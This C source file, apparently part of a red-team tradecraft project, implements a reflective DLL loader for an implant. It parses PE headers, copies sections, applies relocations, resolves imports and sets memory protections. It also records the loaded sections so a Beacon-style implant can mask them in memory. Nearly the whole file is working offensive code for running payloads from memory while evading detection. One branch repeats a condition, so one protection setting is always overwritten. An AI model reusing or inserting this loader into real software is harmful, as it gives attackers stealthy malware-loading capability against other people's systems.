/*
 * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * This file is part of Tradecraft Garden
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, see <https://www.gnu.org/licenses/>.
 */

#include "beacon.h"
#include "stdlib.h"

typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
	__typeof__(VirtualProtect) * VirtualProtect;
} IMPORTFUNCS;

/*
 * implementation begins below.
 */
#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	WORD	offset:12;
	WORD	type:4;
} __IMAGE_RELOC, *__PIMAGE_RELOC;

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry) {
	return dll->OptionalHeader->DataDirectory + entry;
}

void ProcessRelocation(DLLDATA * dll, char * src, char * dst, IMAGE_BASE_RELOCATION * relocation, ULONG_PTR newBaseAddress) {
	void *          relocAddr    = PTR_OFFSET(dst, relocation->VirtualAddress);
	DWORD           relocEntries = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(__IMAGE_RELOC);
	__IMAGE_RELOC * relocEntry   = (__IMAGE_RELOC *)PTR_OFFSET( relocation, sizeof(IMAGE_BASE_RELOCATION) );

	for (int x = 0; x < relocEntries; x++) {
		if (relocEntry->type == IMAGE_REL_BASED_DIR64) {
			*(ULONG_PTR *)(relocAddr + relocEntry->offset) += newBaseAddress;
		}
		else if (relocEntry->type == IMAGE_REL_BASED_HIGHLOW) {
			*(DWORD *)(relocAddr + relocEntry->offset) += (DWORD)newBaseAddress;
		}
		else if (relocEntry->type == IMAGE_REL_BASED_HIGH) {
			*(WORD *)(relocAddr + relocEntry->offset) += HIWORD(newBaseAddress);
		}
		else if (relocEntry->type == IMAGE_REL_BASED_LOW) {
			*(WORD *)(relocAddr + relocEntry->offset) += LOWORD(newBaseAddress);
		}

		relocEntry++;
	}
}

ALLOCATED_MEMORY_LABEL GetLabelFromSectionHeader(IMAGE_SECTION_HEADER * sectionHdr) {
	/* pic strings */
	char text[]  = { '.', 't', 'e', 'x', 't', '\0' };
	char rdata[] = { '.', 'r', 'd', 'a', 't', 'a', '\0' };
	char data[]  = { '.', 'd', 'a', 't', 'a', '\0' };
	char pdata[] = { '.', 'p', 'd', 'a', 't', 'a', '\0' };
	char reloc[] = { '.', 'r', 'e', 'l', 'o', 'c', '\0' };
	
	if (_strncmp((char *)sectionHdr->Name, (char *)text, IMAGE_SIZEOF_SHORT_NAME) == 0) {
		return LABEL_TEXT;
	}
	if (_strncmp((char *)sectionHdr->Name, (char *)rdata, IMAGE_SIZEOF_SHORT_NAME) == 0) {
		return LABEL_RDATA;
	}
	if (_strncmp((char *)sectionHdr->Name, (char *)data, IMAGE_SIZEOF_SHORT_NAME) == 0) {
		return LABEL_DATA;
	}
	if (_strncmp((char *)sectionHdr->Name, (char *)pdata, IMAGE_SIZEOF_SHORT_NAME) == 0) {
		return LABEL_PDATA;
	}
	if (_strncmp((char *)sectionHdr->Name, (char *)reloc, IMAGE_SIZEOF_SHORT_NAME) == 0) {
		return LABEL_RELOC;
	}

	return LABEL_EMPTY;
}

void FixSectionsAndTrackMemory(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst, ALLOCATED_MEMORY_REGION * region) {
	DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
	void                  * sectionDst       = NULL;
	DWORD					newProtection	 = 0;
	DWORD					oldProtection	 = 0;

	/* our first section! */
	sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

	for (int x = 0; x < numberOfSections; x++) {
		/* our destination data */
		sectionDst = dst + sectionHdr->VirtualAddress;

		/* set memory based on header characteristics */
		if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
			newProtection = PAGE_WRITECOPY;
		}
		if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
			newProtection = PAGE_READONLY;
		}
		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
			newProtection = PAGE_READWRITE;
		}
		if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			newProtection = PAGE_EXECUTE;
		}
		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
			newProtection = PAGE_EXECUTE_WRITECOPY;
		}
		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
			newProtection = PAGE_EXECUTE_READ;
		}
		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
			newProtection = PAGE_EXECUTE_READWRITE;
		}

		funcs->VirtualProtect(sectionDst, sectionHdr->SizeOfRawData, newProtection, &oldProtection);
		
		/* set the region info */
		region->Sections[x].Label           = GetLabelFromSectionHeader(sectionHdr);
		region->Sections[x].BaseAddress     = sectionDst;
		region->Sections[x].VirtualSize     = sectionHdr->SizeOfRawData;
		region->Sections[x].CurrentProtect  = newProtection;
		region->Sections[x].PreviousProtect = newProtection;
		region->Sections[x].MaskSection     = TRUE;

		/* advance to our next section */
		sectionHdr++;
	}
}

void ProcessRelocations(DLLDATA * dll, char * src, char * dst) {
	IMAGE_DATA_DIRECTORY  * relocationData;
	ULONG_PTR               newBaseAddress;
	IMAGE_BASE_RELOCATION * relocation;

	relocationData = GetDataDirectory(dll, IMAGE_DIRECTORY_ENTRY_BASERELOC);

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	newBaseAddress = (ULONG_PTR)dst - (ULONG_PTR)dll->OptionalHeader->ImageBase;

	/* check if there are relocations present */
	if (relocationData->Size) {
		relocation = (IMAGE_BASE_RELOCATION *)( dst + relocationData->VirtualAddress );

		while (relocation->SizeOfBlock) {
			/* process this next relocation */
			ProcessRelocation(dll, src, dst, relocation, newBaseAddress);

			/* go on to our next relocation */
			relocation = (IMAGE_BASE_RELOCATION *)PTR_OFFSET(relocation, relocation->SizeOfBlock);
		}
	}
}

void ProcessImport(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst, IMAGE_IMPORT_DESCRIPTOR * importDesc) {
	void                    * hLib;
	IMAGE_THUNK_DATA        * firstThunk;
	IMAGE_THUNK_DATA        * originalFirstThunk;
	IMAGE_IMPORT_BY_NAME    * importByName;
	ULONG_PTR                 importByOrdinal;

	/* load whatever library we need here */
	hLib = (void *)funcs->LoadLibraryA((char *)PTR_OFFSET(dst, importDesc->Name));

	/* get our thunks */
	firstThunk         = (IMAGE_THUNK_DATA *)PTR_OFFSET( dst, importDesc->FirstThunk );
	originalFirstThunk = (IMAGE_THUNK_DATA *)PTR_OFFSET( dst, importDesc->OriginalFirstThunk );

	/* NOTE: IMAGE_THUNK_DATA has one union member, u1. All of the fields are the same size.
	 * The different member names seem more for semantics than anything else. We're skipping the
	 * field names in the union and just stomping over whatever is in this pointer-sized structure */

	/* https://devblogs.microsoft.com/oldnewthing/20231129-00/?p=109077 */

	while ( DEREF(firstThunk) ) {
		if ( originalFirstThunk && (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) ) {
			/*
			 * I'm OK passing a ULONG_PTR with our ordinal. Windows (will likely) just check
			 * that our pointer is < MAXUSHORT ala ReactOS:
			 * https://doxygen.reactos.org/de/de3/dll_2win32_2kernel32_2client_2loader_8c.html#a0f3819de0cdab6061ec9e3432a85bf85
			 */
			importByOrdinal = IMAGE_ORDINAL(originalFirstThunk->u1.Ordinal);
			DEREF(firstThunk) = (ULONG_PTR)funcs->GetProcAddress(hLib, (char *)importByOrdinal);
		}
		/* OK, we are doing an import by name. */
		else {
			importByName      = (IMAGE_IMPORT_BY_NAME *)PTR_OFFSET( dst, firstThunk->u1.AddressOfData );
			DEREF(firstThunk) = (ULONG_PTR)funcs->GetProcAddress(hLib, (char *)importByName->Name);
		}

		/* increment our pointers, to look at next import option */
		firstThunk++;
		if (originalFirstThunk)
			originalFirstThunk++;
	}
}

void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst) {
	IMAGE_DATA_DIRECTORY    * importTableHdr;
	IMAGE_IMPORT_DESCRIPTOR * importDesc;

	/* grab our header for the import table */
	importTableHdr = GetDataDirectory(dll, IMAGE_DIRECTORY_ENTRY_IMPORT);

	/* start with the first function of our import table, we're working solely from our destination memory now */
	importDesc = (IMAGE_IMPORT_DESCRIPTOR *)PTR_OFFSET(dst, importTableHdr->VirtualAddress);

	/* walk our import table and process each of the entries */
	while (importDesc->Name) {
		ProcessImport(funcs, dll, dst, importDesc);
		importDesc++;
	}
}

void LoadSections(DLLDATA * dll, char * src, char * dst) {
	DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
	void                  * sectionDst       = NULL;
	void                  * sectionSrc       = NULL;

	/* our first section! */
	sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

	for (int x = 0; x < numberOfSections; x++) {
		/* our source data to copy from */
		sectionSrc = src + sectionHdr->PointerToRawData;

		/* our destination data */
		sectionDst = dst + sectionHdr->VirtualAddress;

		/* copy our section data over */
		__movsb((unsigned char *)sectionDst, (unsigned char *)sectionSrc, sectionHdr->SizeOfRawData);
		//__builtin_memcpy(sectionDst, sectionSrc, sectionHdr->SizeOfRawData);

		/* advance to our next section */
		sectionHdr++;
	}
}

void ParseDLL(char * src, DLLDATA * data) {
	data->DosHeader      = (IMAGE_DOS_HEADER *)src;
	data->NtHeaders      = (IMAGE_NT_HEADERS *)(src + data->DosHeader->e_lfanew);
	data->OptionalHeader = (IMAGE_OPTIONAL_HEADER *)&(data->NtHeaders->OptionalHeader);
}

typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base) {
	return (DLLMAIN_FUNC)PTR_OFFSET(base, dll->OptionalHeader->AddressOfEntryPoint);
}

DWORD SizeOfDLL(DLLDATA * data) {
	return data->OptionalHeader->SizeOfImage;
}

void LoadDLL(DLLDATA * dll, char * src, char * dst) {
	/* copy our headers over to the destination address, if we wish */
	__movsb((unsigned char *)dst, (unsigned char *)src, dll->OptionalHeader->SizeOfHeaders);

	/* load our section data */
	LoadSections(dll, src, dst);

	/* process our relocations */
	ProcessRelocations(dll, src, dst);
}

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif
